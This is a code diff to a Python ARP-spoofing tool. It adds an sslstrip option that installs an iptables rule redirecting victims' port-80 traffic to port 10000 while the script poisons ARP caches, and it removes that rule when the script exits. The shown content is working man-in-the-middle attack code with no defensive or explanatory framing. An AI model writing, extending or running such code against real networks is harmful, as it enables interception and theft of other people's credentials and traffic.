@@ -52,9 +52,15 @@ parser.add_argument('-d', '--delay', dest='delay', default=2,
                     help='set the daily between sending packets')
 parser.add_argument('-i', '--interface', dest='interface', required=True,
                     help='set the interface where to send the packets')
-
+parser.add_argument('-ssl', '--sslstrip', dest="sslstrip", default=None,
+                    help='Check if this script will be running along sslstrip')
 args = parser.parse_args()
 
+if args.sslstrip == 'true':
+    call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', shell=True)
+    print(f"{colored('[!]', 'green')} The ssltrip routing rule is enabled")
+
+   
 call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
 
 src_mac = get_mac(args.source, args.interface)
@@ -73,6 +79,9 @@ while True:
         sleep(int(args.delay))
     except KeyboardInterrupt:
         call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
+        if args.sslstrip == 'true':
+            call('iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', shell=True)
+            print(f"\n{colored('[!]', 'red')} The ssltrip routing rule is disabled")
         restore(args.target, args.source, src_mac, trg_mac)
-        print(f"\n{colored('[!]', 'green')} spoofing quit")
+        print(f"{colored('[!]', 'green')} spoofing quit")
         exit(0)
